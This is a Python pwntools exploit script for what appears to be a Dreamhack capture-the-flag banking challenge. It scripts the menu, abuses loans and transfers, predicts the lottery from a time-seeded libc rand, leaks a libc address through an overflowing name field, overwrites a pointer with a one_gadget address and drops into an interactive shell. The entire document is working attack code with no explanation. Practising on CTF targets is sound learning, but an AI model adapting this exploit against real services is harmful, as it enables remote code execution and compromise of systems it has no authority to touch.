from pwn import *
from ctypes import CDLL
from time import time

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16633
r = remote(HOST, PORT)

libc = CDLL('./libc.so.6')

def accounts():
    r.sendlineafter(b': ', b'1')

def history():
    r.sendlineafter(b': ', b'2')

def add_user(id, password):
    r.sendlineafter(b': ', b'6')
    r.sendlineafter(b': ', id)
    r.sendlineafter(b': ', password)

def login(id, password):
    r.sendlineafter(b': ', b'7')
    r.sendlineafter(b': ', id)
    r.sendlineafter(b': ', password)

def logout():
    r.sendlineafter(b': ', b'8')

def delete():
    r.sendlineafter(b': ', b'7')
    r.sendlineafter(b': ', b'3')

def info():
    r.sendlineafter(b': ', b'7')
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b'Input : ', b'0')

def transfer(acc, amount):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b'to be transfer.\n', b'%d'%acc)
    r.sendlineafter(b'to be transfer.\n', b'%d'%amount)

def transfer_vip(acc, amount):
    r.sendlineafter(b': ', b'8')
    r.sendlineafter(b'to be transfer.\n', b'%d'%acc)
    r.sendlineafter(b'to be transfer.\n', b'%d'%amount)

def loan():
    r.sendlineafter(b': ', b'4')

def lottery(winning_ticket):
    r.sendlineafter(b': ', b'5')
    for i in range(7):
        r.sendlineafter(b'] : ', b'%d'%winning_ticket[i])

def edit(memo):
    r.sendlineafter(b': ', b'7')
    r.sendlineafter(b': ', b'2' + memo)


add_user(b'A', b'A')
login(b'A', b'A')
r.sendlineafter(b': ', b'1')
r.recvuntil(b'Account number : ')
acc1 = int(r.recvline().strip())

logout()

for i in range(2):
    add_user(b'%d'%i, b'%d'%i)
    login(b'%d'%i, b'%d'%i)
    for x in range(9):
        loan()
    transfer(acc1, 90)
    logout()


login(b'A', b'A')
libc.srand(int(time()+1))

winning_ticket = [0] * 7
cnt = 0
while cnt < 7:
    num = libc.rand() % 37 + 1
    if num in winning_ticket:
        continue
    winning_ticket[cnt] = num
    cnt += 1

lottery(winning_ticket)

r.sendafter(b': \n', b'A'*0x8)
r.sendafter(b': \n', b'A')

r.recvuntil(b'Name : ' + b'A'*0x8)
libc = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x94013
print(hex(libc))
system = libc + 0x55410
binsh = libc + 0x1b75aa
sh = libc+0xe6c81
accounts()
edit(b'B'*0x38 + p64(sh))
r.sendlineafter(b': ', b'0')
transfer_vip(acc1, 0)

r.interactive()